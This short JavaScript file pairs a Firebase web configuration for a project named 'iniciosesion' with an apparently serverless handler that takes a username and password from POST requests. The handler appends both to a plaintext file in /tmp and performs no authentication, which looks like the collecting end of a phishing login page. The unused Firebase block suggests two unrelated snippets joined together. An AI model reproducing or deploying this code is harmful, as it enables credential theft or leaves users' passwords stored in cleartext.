// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDruCnTHTuRa4oVkyJo2kHG1M9SL_tM4uU",
  authDomain: "iniciosesion-bcf4c.firebaseapp.com",
  databaseURL: "https://iniciosesion-bcf4c-default-rtdb.firebaseio.com",
  projectId: "iniciosesion-bcf4c",
  storageBucket: "iniciosesion-bcf4c.firebasestorage.app",
  messagingSenderId: "4409158395",
  appId: "1:4409158395:web:be2f977740f33a93e65e5e",
  measurementId: "G-QN1LQFRM86"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);


import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
    if (req.method === 'POST') {
        const { username, password } = req.body;

        // Ruta temporal para guardar datos, no persistente
        const filePath = path.join('/tmp', 'usuarios.txt');

        // Guardar la información en el archivo
        fs.appendFile(filePath, `Usuario: ${username}, Contraseña: ${password}\n`, (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Error al guardar los datos');
            }
            res.status(200).send('Datos guardados con éxito');
        });
    } else {
        res.status(405).send('Método no permitido');
    }
}
